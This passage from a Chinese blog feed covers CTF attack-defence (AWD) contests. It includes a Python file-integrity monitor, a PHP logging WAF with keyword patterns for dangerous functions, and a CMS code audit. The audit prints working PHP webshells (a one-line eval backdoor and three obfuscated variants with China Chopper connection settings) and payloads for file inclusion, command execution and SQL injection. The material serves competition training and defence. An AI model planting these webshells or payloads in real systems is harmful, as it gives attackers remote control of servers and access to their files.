class="line">Special_string = &#x27;drops_log&#x27;  # 免死金牌</span><br><span class="line">UNICODE_ENCODING = &quot;utf-8&quot;</span><br><span class="line">INVALID_UNICODE_CHAR_FORMAT = r&quot;\?%02x&quot;</span><br><span class="line"></span><br><span class="line"># 文件路径字典</span><br><span class="line">spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))</span><br><span class="line">Special_path = &#123;</span><br><span class="line">    &#x27;bak&#x27; : os.path.realpath(os.path.join(spec_base_path, bakstring)),</span><br><span class="line">    &#x27;log&#x27; : os.path.realpath(os.path.join(spec_base_path, logstring)),</span><br><span class="line">    &#x27;webshell&#x27; : os.path.realpath(os.path.join(spec_base_path, webshellstring)),</span><br><span class="line">    &#x27;difffile&#x27; : os.path.realpath(os.path.join(spec_base_path, difffile)),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def isListLike(value):</span><br><span class="line">    return isinstance(value, (list, tuple, set))</span><br><span class="line"></span><br><span class="line"># 获取Unicode编码</span><br><span class="line">def getUnicode(value, encoding=None, noneToNull=False):</span><br><span class="line"></span><br><span class="line">    if noneToNull and value is None:</span><br><span class="line">        return NULL</span><br><span class="line"></span><br><span class="line">    if isListLike(value):</span><br><span class="line">        value = list(getUnicode(_, encoding, noneToNull) for _ in value)</span><br><span class="line">        return value</span><br><span class="line"></span><br><span class="line">    if isinstance(value, unicode):</span><br><span class="line">        return value</span><br><span class="line">    elif isinstance(value, basestring):</span><br><span class="line">        while True:</span><br><span class="line">            try:</span><br><span class="line">                return unicode(value, encoding or UNICODE_ENCODING)</span><br><span class="line">            except UnicodeDecodeError, ex:</span><br><span class="line">                try:</span><br><span class="line">                    return unicode(value, UNICODE_ENCODING)</span><br><span class="line">                except:</span><br><span class="line">                    value = value[:ex.start] + &quot;&quot;.join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:]</span><br><span class="line">    else:</span><br><span class="line">        try:</span><br><span class="line">            return unicode(value)</span><br><span class="line">        except UnicodeDecodeError:</span><br><span class="line">            return unicode(str(value), errors=&quot;ignore&quot;)</span><br><span class="line"></span><br><span class="line"># 目录创建</span><br><span class="line">def mkdir_p(path):</span><br><span class="line">    import errno</span><br><span class="line">    try:</span><br><span class="line">        os.makedirs(path)</span><br><span class="line">    except OSError as exc:</span><br><span class="line">        if exc.errno == errno.EEXIST and os.path.isdir(path):</span><br><span class="line">            pass</span><br><span class="line">        else: raise</span><br><span class="line"></span><br><span class="line"># 获取当前所有文件路径</span><br><span class="line">def getfilelist(cwd):</span><br><span class="line">    filelist = []</span><br><span class="line">    for root,subdirs, files in os.walk(cwd):</span><br><span class="line">        for filepath in files:</span><br><span class="line">            originalfile = os.path.join(root, filepath)</span><br><span class="line">            if Special_path_str not in originalfile:</span><br><span class="line">                filelist.append(originalfile)</span><br><span class="line">    return filelist</span><br><span class="line"></span><br><span class="line"># 计算机文件MD5值</span><br><span class="line">def calcMD5(filepath):</span><br><span class="line">    try:</span><br><span class="line">        with open(filepath,&#x27;rb&#x27;) as f:</span><br><span class="line">            md5obj = hashlib.md5()</span><br><span class="line">            md5obj.update(f.read())</span><br><span class="line">            hash = md5obj.hexdigest()</span><br><span class="line">            return hash</span><br><span class="line">    except Exception, e:</span><br><span class="line">        print u&#x27;[!] getmd5_error : &#x27; + getUnicode(filepath)</span><br><span class="line">        print getUnicode(e)</span><br><span class="line">        try:</span><br><span class="line">            ORIGIN_FILE_LIST.remove(filepath)</span><br><span class="line">            FILE_MD5_DICT.pop(filepath, None)</span><br><span class="line">        except KeyError, e:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line"># 获取所有文件MD5</span><br><span class="line">def getfilemd5dict(filelist = []):</span><br><span class="line">    filemd5dict = &#123;&#125;</span><br><span class="line">    for ori_file in filelist:</span><br><span class="line">        if Special_path_str not in ori_file:</span><br><span class="line">            md5 = calcMD5(os.path.realpath(ori_file))</span><br><span class="line">            if md5:</span><br><span class="line">                filemd5dict[ori_file] = md5</span><br><span class="line">    return filemd5dict</span><br><span class="line"></span><br><span class="line"># 备份所有文件</span><br><span class="line">def backup_file(filelist=[]):</span><br><span class="line">    # if len(os.listdir(Special_path[&#x27;bak&#x27;])) == 0:</span><br><span class="line">    for filepath in filelist:</span><br><span class="line">        if Special_path_str not in filepath:</span><br><span class="line">            shutil.copy2(filepath, Special_path[&#x27;bak&#x27;])</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print u&#x27;---------start------------&#x27;</span><br><span class="line">    for value in Special_path:</span><br><span class="line">        mkdir_p(Special_path[value])</span><br><span class="line">    # 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件</span><br><span class="line">    ORIGIN_FILE_LIST = getfilelist(CWD)</span><br><span class="line">    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">    backup_file(ORIGIN_FILE_LIST) # TODO 备份文件可能会产生重名BUG</span><br><span class="line">    print u&#x27;[*] pre work end!&#x27;</span><br><span class="line">    while True:</span><br><span class="line">        file_list = getfilelist(CWD)</span><br><span class="line">        # 移除新上传文件</span><br><span class="line">        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))</span><br><span class="line">        if len(diff_file_list) != 0:</span><br><span class="line">            # import pdb;pdb.set_trace()</span><br><span class="line">            for filepath in diff_file_list:</span><br><span class="line">                try:</span><br><span class="line">                    f = open(filepath, &#x27;r&#x27;).read()</span><br><span class="line">                except Exception, e:</span><br><span class="line">                    break</span><br><span class="line">                if Special_string not in f:</span><br><span class="line">                    try:</span><br><span class="line">                        print u&#x27;[*] webshell find : &#x27; + getUnicode(filepath)</span><br><span class="line">                        shutil.move(filepath, os.path.join(Special_path[&#x27;webshell&#x27;], ntpath.basename(filepath) + &#x27;.txt&#x27;))</span><br><span class="line">                    except Exception as e:</span><br><span class="line">                        print u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;%getUnicode(filepath)</span><br><span class="line">                    try:</span><br><span class="line">                        f = open(os.path.join(Special_path[&#x27;log&#x27;], &#x27;log.txt&#x27;), &#x27;a&#x27;)</span><br><span class="line">                        f.write(&#x27;newfile: &#x27; + getUnicode(filepath) + &#x27; : &#x27; + str(time.ctime()) + &#x27;\n&#x27;)</span><br><span class="line">                        f.close()</span><br><span class="line">                    except Exception as e:</span><br><span class="line">                        print u&#x27;[-] log error : file move error: &#x27; + getUnicode(e)</span><br><span class="line"></span><br><span class="line">        # 防止任意文件被修改,还原被修改文件</span><br><span class="line">        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">        for filekey in md5_dict:</span><br><span class="line">            if md5_dict[filekey] != FILE_MD5_DICT[filekey]:</span><br><span class="line">                try:</span><br><span class="line">                    f = open(filekey, &#x27;r&#x27;).read()</span><br><span class="line">                except Exception, e:</span><br><span class="line">                    break</span><br><span class="line">                if Special_string not in f:</span><br><span class="line">                    try:</span><br><span class="line">                        print u&#x27;[*] file had be change : &#x27; + getUnicode(filekey)</span><br><span class="line">                        shutil.move(filekey, os.path.join(Special_path[&#x27;difffile&#x27;], ntpath.basename(filekey) + &#x27;.txt&#x27;))</span><br><span class="line">                        shutil.move(os.path.join(Special_path[&#x27;bak&#x27;], ntpath.basename(filekey)), filekey)</span><br><span class="line">                    except Exception as e:</span><br><span class="line">                        print u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;%getUnicode(filekey)</span><br><span class="line">                    try:</span><br><span class="line">                        f = open(os.path.join(Special_path[&#x27;log&#x27;], &#x27;log.txt&#x27;), &#x27;a&#x27;)</span><br><span class="line">                        f.write(&#x27;diff_file: &#x27; + getUnicode(filekey) + &#x27; : &#x27; + getUnicode(time.ctime()) + &#x27;\n&#x27;)</span><br><span class="line">                        f.close()</span><br><span class="line">                    except Exception as e:</span><br><span class="line">                        print u&#x27;[-] log error : done_diff: &#x27; + getUnicode(filekey)</span><br><span class="line">                        pass</span><br><span class="line">        time.sleep(2)</span><br><span class="line">        # print &#x27;[*] &#x27; + getUnicode(time.ctime()) </span><br></pre></td></tr></table></figure><h4 id="不死马清理："><a href="#不死马清理：" class="headerlink" title="不死马清理："></a>不死马清理：</h4><p><code>ps aux www|grep shell.php</code></p><p>找到pid后杀掉进程就可以，你删掉脚本是起不了作用的，因为php执行的时候已经把脚本读进去解释成opcode运行了</p><p>重启php等web服务</p><p>用一个<code>ignore_user_abort(true)</code>脚本，一直竞争写入（断断续续）。usleep要低于对方不死马设置的值。</p><p>创建一个和不死马生成的马一样名字的文件夹。</p><h4 id="不死马、waf、抓流量的waf"><a href="#不死马、waf、抓流量的waf" class="headerlink" title="不死马、waf、抓流量的waf"></a>不死马、waf、抓流量的waf</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">不死马使用原理就是不断将的自己写入，造成进程占用，被删除后一秒就已经生成新的了，还有就是.XXX文件建立隐藏文件不死马。</span><br><span class="line">waf，脚本waf可以防止一般情况下的危险字符，但是不能报太大希望， </span><br></pre></td></tr></table></figure><p><code>require_once(&#39;waf.php&#39;);</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find /tmp/test/html -name <span class="string">&quot;*.php&quot;</span> | xargs sed -i <span class="string">&#x27;1s/^/&lt;?php include_once &quot;\/tmp\/waf.php&quot;;?&gt;\n /&#x27;</span></span><br><span class="line">````</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>抓流量waf，挂载后可以让防守队员_实时关注日志，一旦发现被getflag了，就通过日志相应的手法攻击别人 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**waf脚本**</span><br><span class="line"></span><br><span class="line">&gt; PHPWaf用来记录访问请求，通过分析访问请求来判断对方的攻击方式，作用是感知漏洞，判断攻击方式，从而修复漏洞。</span><br><span class="line"></span><br></pre></td></tr></table></figure><?php //部署waf可能会导致服务不可用，需要谨慎部署。    error_reporting(0);    define('LOG_FILENAME','log.txt');    function waf()    {        if (!function_exists('getallheaders')) {            function getallheaders() {                foreach ($_SERVER as $name => $value) {                    if (substr($name, 0, 5) == 'HTTP_')                        $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;                }                return $headers;            }        }        $get = $_GET;        $post = $_POST;        $cookie = $_COOKIE;        $header = getallheaders();        $files = $_FILES;        $ip = $_SERVER["REMOTE_ADDR"];        $method = $_SERVER['REQUEST_METHOD'];        $filepath = $_SERVER["SCRIPT_NAME"];                //rewirte shell which uploaded by others, you can do more        foreach ($_FILES as $key => $value) {            $files[$key]['content'] = file_get_contents($_FILES[$key]['tmp_name']);            file_put_contents($_FILES[$key]['tmp_name'], "virink");        }        unset($header['Accept']);//fix a bug        $input = array("Get"=>$get, "Post"=>$post, "Cookie"=>$cookie, "File"=>$files, "Header"=>$header);        //deal with        $pattern = "select|insert|update|delete|and|or|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex";        $pattern .= "|file_put_contents|fwrite|curl|system|eval|assert";        $pattern .="|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore";        $pattern .="|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec";        $vpattern = explode("|",$pattern);        $bool = false;        foreach ($input as $k => $v) {            foreach($vpattern as $value){                foreach ($v as $kk => $vv) {                    if (preg_match( "/$value/i", $vv )){                        $bool = true;                        logging($input);                        break;                    }                }                if($bool) break;            }            if($bool) break;        }    }     function logging($var){        file_put_contents(LOG_FILENAME, "\r\n".time()."\r\n".print_r($var, true), FILE_APPEND);        // die() or unset($_GET) or unset($_POST) or unset($_COOKIE);    }    waf();?><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">waf的激活方式：</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li><p>php.ini选项：auto_prepend_file &#x3D;与auto_append_file &#x3D;包含waf，需要权限较高。</p></li><li><p>config.php 中包含waf</p></li><li><p>让所有的文件都包含waf</p></li></ol><p>&#96;&#96;&#96;</p><h3 id="0x07流量分析"><a href="#0x07流量分析" class="headerlink" title="0x07流量分析"></a>0x07流量分析</h3><ol><li>查看当前访问量前十的链接</li></ol><p><code>cat /var/log/apache2/access.log | cut -f4 -d | sort | uniq -c | sort -k -r | head -</code></p><ol start="2"><li><p>文件监控增删改查的文件使用脚本Monitor（一个简单的文件监控示例脚本，可以监控创建、删除、移动、属性修改操作，自动删除新增文件或目录。已使用pyinstaller打包成了linux可执行程序）</p></li><li><p>chattr +i 命令锁死网站目录和文件，防止其他队伍删除网站宕机。注：添加后不取消特殊权限 即使是root用户也无法删除&#x2F;修改文件</p><p>chattr -R +i &#x2F;var&#x2F;www&#x2F;html<br>chattr -R +i &#x2F;var&#x2F;www&#x2F;html&#x2F;*<br>(取消命令将+号改成- chattr -R -i &#x2F;var&#x2F;www&#x2F;html）</p></li><li><p>使用waf全局包含waf，注意waf的日志和weblogger日志与第二项文件监控冲突，建议建立文件夹将日志和weblogger日志放到指定文件夹中，避开文件监控，</p><p>sudo find &#x2F;var&#x2F;www&#x2F;html&#x2F;path_you_want -type f -path “*.php” | xargs sed -i “s&#x2F;&lt;?php&#x2F;&lt;?php\nrequire_once(’&#x2F;tmp&#x2F;waf.php’);\n&#x2F;g”<br>#意思就是查找需要加waf的目录下所有php文件，在头部添加一句，用require_once函数引入&#x2F;tmp&#x2F;waf.php文件。因为sed命令利用 &#x2F; 区分文件中的原字符串和修改的字符串，所以我们要对 &#x2F; 进行转义。类似于在单引号中再次使用单引号时我们也要用反斜杠转义。</p></li><li><p>后台一定要登陆后台，有没有弱口令，修改成强口令。</p></li><li><p>不只是后台，phpmyadmin、测试页面容易出现sql注入，rce之类的这些</p></li></ol><h2 id="AWD资源小合集"><a href="#AWD资源小合集" class="headerlink" title="AWD资源小合集:"></a>AWD资源小合集:</h2><p><a href="https://neversec.top/20190415/how-to-awd.html">https://neversec.top/20190415/how-to-awd.html</a></p><p><strong>参考网站：</strong></p><p><a href="https://blog.csdn.net/qq/_42114918/article/details/82785960#comments">https://blog.csdn.net/qq\_42114918/article/details/82785960#comments</a></p><p><a href="https://blog.csdn.net/qq/_43625917/article/details/96158713">https://blog.csdn.net/qq\_43625917/article/details/96158713</a></p><p><a href="http://www.admintony.com/AWD%E8%A5%BF%E7%9F%B3%E6%B2%B9%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93.html">http://www.admintony.com/AWD%E8%A5%BF%E7%9F%B3%E6%B2%B9%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93.html</a></p><p><a href="https://blog.csdn.net/like98k/article/details/80261603">https://blog.csdn.net/like98k/article/details/80261603</a></p><p><a href="http://www.8sec.cc/index.php/archives/97/">http://www.8sec.cc/index.php/archives/97/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTF线下AWD攻防步骤总结：&quot;&gt;&lt;a href=&quot;#CTF线下AWD攻防步骤总结：&quot; class=&quot;headerlink&quot; title=&quot;CTF线下AWD攻防步骤总结：&quot;&gt;&lt;/a&gt;CTF线下AWD攻防步骤总结：&lt;/h1&gt;&lt;p&gt;ctf线下AWD攻防赛学习笔记：&lt;a</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="AWD" scheme="http://example.com/tags/AWD/"/>
    
    <category term="攻防" scheme="http://example.com/tags/%E6%94%BB%E9%98%B2/"/>
    
  </entry>
  
  <entry>
    <title>CTF AWD模式下简单的CMS代码审计</title>
    <link href="http://example.com/2022/09/09/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/CTF%E7%BA%BF%E4%B8%8BAWD%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>http://example.com/2022/09/09/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/CTF%E7%BA%BF%E4%B8%8BAWD%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2022-09-09T01:47:07.275Z</published>
    <updated>2022-09-09T05:05:42.197Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTF-AWD模式下简单的CMS代码审计"><a href="#CTF-AWD模式下简单的CMS代码审计" class="headerlink" title="CTF AWD模式下简单的CMS代码审计"></a>CTF AWD模式下简单的CMS代码审计</h1><p>ctf线下AWD攻防赛学习笔记：<a href="https://blog.csdn.net/qq_43442524/article/details/102653414">https://blog.csdn.net/qq_43442524&#x2F;article&#x2F;details&#x2F;102653414</a><br>CTF线下AWD攻防步骤总结：<a href="https://blog.csdn.net/qq_43442524/article/details/102652029">https://blog.csdn.net/qq_43442524&#x2F;article&#x2F;details&#x2F;102652029</a></p><p>今天先把去年的AWD代码审计一下,以后有时间就把今年的AWD代码审计写一下</p><h2 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">include &#x27;header.php&#x27;;</span><br><span class="line">@eval($_REQUEST[&#x27;aa&#x27;]);</span><br><span class="line">echo &#x27;eval&#x27;;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMjAyMTA3NDMyMV8xNTcwNTE5MTk1NDkzLzA?x-oss-process=image/format,png"></p><p>首先打开index.php,一目了然,可以看到头文件有一句话木马,密码是<code>aa</code></p><p>这里使用中国菜刀可以直接连上一句话木马,进入服务器</p><h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><h4 id="了解一句话脚本的工作原理"><a href="#了解一句话脚本的工作原理" class="headerlink" title="了解一句话脚本的工作原理"></a>了解一句话脚本的工作原理</h4><h6 id="一句话脚本的工作原理："><a href="#一句话脚本的工作原理：" class="headerlink" title="一句话脚本的工作原理："></a>一句话脚本的工作原理：</h6><p>一句话恶意脚本分析服务端与客户端。(此处以php脚本语言简述原理）</p><p>一句话恶意脚本服务端就是我们要用来插入到php文件中的asp语句，（不仅仅是以php为后缀的数据库文件），该语句将回为触发，接收入侵者通过客户端提交的数据，执行并完成相应的操作，服务端的代码内容为<code>@eval($\_REQUEST\[‘aa’\]);</code> 其中aa可以自己修改</p><p>一句话恶意脚本客户端（即为中国菜刀主程序）用来向服务端提交控制数据的，提交的数据通过服务端构成完整的php功能语句并执行.</p><blockquote><p>中国菜刀的请求方式为post。</p></blockquote><h4 id="一句话脚本的变形"><a href="#一句话脚本的变形" class="headerlink" title="一句话脚本的变形"></a>一句话脚本的变形</h4><h5 id="案例1"><a href="#案例1" class="headerlink" title="案例1"></a>案例1</h5><p>加密类变形</p><p>php一句话恶意脚本带404页面,带MD5加密,可浏览器POST任意php代码执行. 代码如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">echo &quot;404 Not Found!&lt;/br&gt;&quot;; error_reporting(0);</span><br><span class="line">if(isset($_POST[&#x27;com&#x27;]) &amp;&amp; md5($_POST[&#x27;com&#x27;]) == &#x27;791dc312b38016ef998c1c146104cd5a&#x27; &amp;&amp; isset($_POST[&#x27;content&#x27;])) $content = strtr($_POST[&#x27;content&#x27;], &#x27;-_,&#x27;, &#x27;+/=&#x27;);eval(base64_decode($content));</span><br><span class="line">echo &quot;We&#x27;re sorry but the page your are looking for is Not Found...&quot;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>在菜刀里写<code>http://xx.xx.xx.xx/test.php</code></p><p>密码:<code>page</code></p><p>菜刀配置填：</p><p><code>＜O＞com=settoken&amp;content=ZXZhbCgkX1BPU1RbJ3BhZ2UnXSk7＜/O＞</code></p><h5 id="案例2-变量拼接类变形"><a href="#案例2-变量拼接类变形" class="headerlink" title="案例2 变量拼接类变形"></a>案例2 变量拼接类变形</h5><p>webshell的代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$sF=&quot;PCT4BA6ODSE_&quot;;$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;[&#x27;n985de9&#x27;];if(isset($s22))&#123;eval($s21($s22));&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>在菜刀里写<a href="http://xx.xx.xx.xx/test.php">http://xx.xx.xx.xx/test.php</a></p><p>密码是:<code>0</code></p><p>菜刀配置填：</p><p><code>＜O＞n985de9=QGV2YWwoJF9QT1NUWzBdKTs=＜/O＞</code></p><h5 id="案例3-加密拼接类变形"><a href="#案例3-加密拼接类变形" class="headerlink" title="案例3 加密拼接类变形"></a>案例3 加密拼接类变形</h5><p>webshell的代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF(&quot;&quot;,$_cC);@$_();?&gt; </span><br></pre></td></tr></table></figure><p>在菜刀里写<a href="http://xx.xx.xx.xx/test.php">http://xx.xx.xx.xx/test.php</a></p><p>连接密码：<code>1</code></p><h2 id="about-php"><a href="#about-php" class="headerlink" title="about.php"></a>about.php</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMjAyMTA3NDMyMV8xNTcwNTE5Mzg0OTgyLzA?x-oss-process=image/format,png"></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTk5Mzg5MDMxXzE1NzA1MTk0MzQ5MDYvMA?x-oss-process=image/format,png"></p><p>可以看到这里打开了 <code>allow_url_include</code> 并且代码中有明显的<code>文件包含漏洞</code></p><p>payload为<code>?file=/etc/passwd</code></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMjAyMTA3NDMyMV8xNTcwNTE5NjgwOTc3LzA?x-oss-process=image/format,png"></p><p>具体的文件包含漏洞可以查看<a href="https://www.k0rz3n.com/2018/11/20/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8B%20PHP%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#5-proc-self-environ">这篇文章</a></p><h2 id="services-php"><a href="#services-php" class="headerlink" title="services.php"></a>services.php</h2><p>这里我们点击第三个选项<code>服务</code>,点击以后页面正常 这里我们去查看一下它的源码</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfNzM2NjcwMDMyXzE1NzA1MTk5Mzg4MzIvMA?x-oss-process=image/format,png"></p><p>发现有异常,这里是一个简单的命令执行漏洞</p><p>payload:?shell&#x3D;ls</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTk5Mzg5MDMxXzE1NzA1MjAzMTUzODkvMA?x-oss-process=image/format,png"></p><h2 id="contact-php"><a href="#contact-php" class="headerlink" title="contact.php"></a>contact.php</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTk5Mzg5MDMxXzE1NzA1MjAzNjM3NDQvMA?x-oss-process=image/format,png"></p><p>查看源码:</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMjAyMTA3NDMyMV8xNTcwNTIwNDM2MzI1LzA?x-oss-process=image/format,png"></p><p>可以发现这里也是一个文件包含漏洞,不过相比上面那个有些复杂</p><p>payload:?path&#x3D;&#x2F;etc&#x2F;passwd</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfNzk2NDgwMzM2XzE1NzA1MjA1NDg0NjQvMA?x-oss-process=image/format,png"></p><p>爆出passwd文件</p><h2 id="footer-php"><a href="#footer-php" class="headerlink" title="footer.php"></a>footer.php</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfNzM2NjcwMDMyXzE1NzA1MjA1ODIyNjUvMA?x-oss-process=image/format,png"></p><p>返回主页 发现页面底端有异常</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTk5Mzg5MDMxXzE1NzA1MjA2NDY0OTQvMA?x-oss-process=image/format,png"></p><p>这里有简单的命令执行漏洞</p><p>注释即可</p><h2 id="admin页面"><a href="#admin页面" class="headerlink" title="admin页面"></a>admin页面</h2><p>在登陆界面</p><h3 id="login-php"><a href="#login-php" class="headerlink" title="login.php"></a>login.php</h3><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTQwOTA3NTY4M18xNTcwNTM1NjE0MDE3LzA?x-oss-process=image/format,png"></p><p>简单的sql注入</p><p>payload:<code>admin &#39; #</code></p><h2 id="header-php"><a href="#header-php" class="headerlink" title="header.php"></a>header.php</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTQwOTA3NTY4M18xNTcwNTM1NzU1ODAyLzA?x-oss-process=image/format,png"></p><p>这里是一个php命令执行漏洞</p><p>payload: <code>?p=cat /flag.txt</code></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTIxODk5OTkwNl8xNTcwNTM2OTk2MjU4LzA?x-oss-process=image/format,png"></p><p>好了,代码就差不多就审计到这里了,一些简单的后门漏洞等用D盾或审计工具可以找出来,要想提高自己的话尽量花点时间,自主审计</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTF-AWD模式下简单的CMS代码审计&quot;&gt;&lt;a href=&quot;#CTF-AWD模式下简单的CMS代码审计&quot; class=&quot;headerlink&quot; title=&quot;CTF AWD模式下简单的CMS代码审计&quot;&gt;&lt;/a&gt;CTF AWD模式下简单的CMS代码审计&lt;/h1&gt;&lt;</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="AWD" scheme="http://example.com/tags/AWD/"/>
    
    <category term="攻防" scheme="http://example.com/tags/%E6%94%BB%E9%98%B2/"/>
    
  </entry>
  
  <entry>
    <title>ctf线下AWD攻防赛学习笔记</title>
    <link href="http://example.com/2022/09/09/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://example.com/2022/09/09/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2022-09-09T01:18:20.712Z</published>
    <updated>2022-09-09T05:05:10.369Z</updated>
    
